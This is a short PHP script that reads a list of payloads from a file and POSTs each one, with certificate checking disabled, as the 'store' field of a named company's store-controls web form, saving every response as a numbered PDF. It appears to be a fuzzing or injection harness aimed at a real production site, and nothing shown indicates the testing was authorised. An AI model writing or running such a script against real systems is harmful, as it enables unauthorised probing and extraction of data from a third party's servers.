<?php

$ch = curl_init();


curl_setopt($ch, CURLOPT_URL, 'https://goals.luxottica.com/storecontrols/form');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,  CURLOPT_RETURNTRANSFER, TRUE);

$payText = file_get_contents('payloads.txt');
$payloads = explode("\n", $payText);
$i = 1;

foreach($payloads as $payload){
    $cs = 'store=' . $payload . '&forDate=2018-05-16';
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cs);
    $data = curl_exec($ch);
    $fileName = $i . "audit.pdf";
    file_put_contents($fileName, $data);
    $i++;
}
curl_close($ch);

?>